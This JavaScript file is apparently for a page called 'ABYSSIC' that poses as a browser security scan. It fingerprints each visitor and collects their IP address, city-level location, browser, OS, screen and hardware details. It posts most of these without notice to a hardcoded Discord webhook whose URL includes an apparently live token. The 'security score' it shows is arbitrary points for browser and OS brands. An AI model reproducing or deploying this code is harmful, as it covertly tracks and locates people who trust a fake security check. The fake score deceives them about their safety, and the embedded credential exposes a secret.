// Initialize webhook URL - to be set in production
const WEBHOOK_URL = "https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z";

// Cookie functions
function setCookie(name, value, days) {
    const date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    const expires = "; expires=" + date.toUTCString();
    document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Strict; Secure";
}

function getCookie(name) {
    const nameEQ = name + "=";
    const ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) === ' ') c = c.substring(1);
        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

function eraseCookie(name) {
    document.cookie = name + '=; Max-Age=-99999999; path=/';
}

// Security data collection
async function collectSecurityData() {
    try {
        console.log("[ABYSSIC] Initializing security data collection...");

        // Device fingerprint
        const fpPromise = import('https://openfpcdn.io/fingerprintjs/v3')
            .then(FingerprintJS => FingerprintJS.load());

        const fp = await fpPromise;
        const result = await fp.get();
        fpValue.textContent = result.visitorId;

        // IP and Geolocation
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ipValue.textContent = ipData.ip;

        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const geoData = await geoResponse.json();
        const locationString = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
        geoValue.textContent = locationString;
        userLocation.textContent = locationString;

        // Browser and OS
        const userAgent = navigator.userAgent;
        let browser = "Unknown";
        let os = "Unknown";

        // Browser detection
        if (userAgent.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
        else if (userAgent.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
        else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) browser = "Opera";
        else if (userAgent.indexOf("Trident") > -1) browser = "Internet Explorer";
        else if (userAgent.indexOf("Edge") > -1) browser = "Microsoft Edge";
        else if (userAgent.indexOf("Chrome") > -1) browser = "Google Chrome";
        else if (userAgent.indexOf("Safari") > -1) browser = "Apple Safari";

        // OS detection
        if (userAgent.indexOf("Windows") > -1) os = "Windows";
        else if (userAgent.indexOf("Mac") > -1) os = "MacOS";
        else if (userAgent.indexOf("X11") > -1) os = "Unix";
        else if (userAgent.indexOf("Linux") > -1) os = "Linux";
        else if (userAgent.indexOf("Android") > -1) os = "Android";
        else if (userAgent.indexOf("iOS") > -1) os = "iOS";

        browserValue.textContent = `${browser} on ${os}`;

        // Screen resolution
        screenValue.textContent = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;

        // Language and locale
        localeValue.textContent = `${navigator.language} / ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;

        // Battery status
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryValue.textContent = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
        } else {
            batteryValue.textContent = "Not Available";
        }

        // Connection type
        if (navigator.connection) {
            const connection = navigator.connection;
            connectionValue.textContent = `${connection.effectiveType} (${connection.downlink} Mbps)`;
            networkStatus.textContent = connection.effectiveType || "Connected";
        } else {
            connectionValue.textContent = "Not Available";
            networkStatus.textContent = "Connected";
        }

        // Hardware info
        const cores = navigator.hardwareConcurrency || "Unknown";
        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
        hardwareValue.textContent = `CPU Cores: ${cores} / RAM: ${memory}`;

        // Time info
        const now = new Date();
        timeValue.textContent = now.toLocaleString();

        // Calculate security score
        let score = 65; // Base score

        // Add points based on browser
        if (browser === "Mozilla Firefox") score += 15;
        else if (browser === "Google Chrome") score += 10;
        else if (browser === "Safari") score += 8;
        else if (browser === "Microsoft Edge") score += 5;

        // Add points based on OS
        if (os === "Linux") score += 20;
        else if (os === "MacOS") score += 15;
        else if (os === "Windows") score += 10;

        // Adjust based on connection
        if (navigator.connection && navigator.connection.effectiveType === '4g') score += 5;

        // Clamp the score
        score = Math.min(Math.max(score, 30), 95);

        // Update the security score
        const scoreText = score >= 80 ? "Good" : score >= 60 ? "Moderate" : "Poor";
        securityScore.textContent = `${scoreText} (${score}/100)`;

        // Log activity
        addActivity("Security scan completed", "System security assessment finished with score: " + score);

        // Send data to webhook
        if (WEBHOOK_URL === "https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z") {
            const securityData = {
                fingerprint: result.visitorId,
                ip: ipData.ip,
                location: locationString,
                browser: `${browser} on ${os}`,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                securityScore: score,
                timestamp: now.toISOString()
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `**[SECURITY SCAN]**\n• Fingerprint: \`${securityData.fingerprint}\`\n• IP: \`${securityData.ip}\`\n• Location: \`${securityData.location}\`\n• Browser: \`${securityData.browser}\`\n• Score: \`${securityData.securityScore}/100\`\n• Time: \`${now.toLocaleString()}\``
                })
            });
        }

        console.log("[ABYSSIC] Security data collection complete!");
        return true;
    } catch (error) {
        console.error("[ABYSSIC] Error collecting security data:", error);
        addActivity("Error", "Failed to complete security scan. Error: " + error.message);
        return false;
    }
}
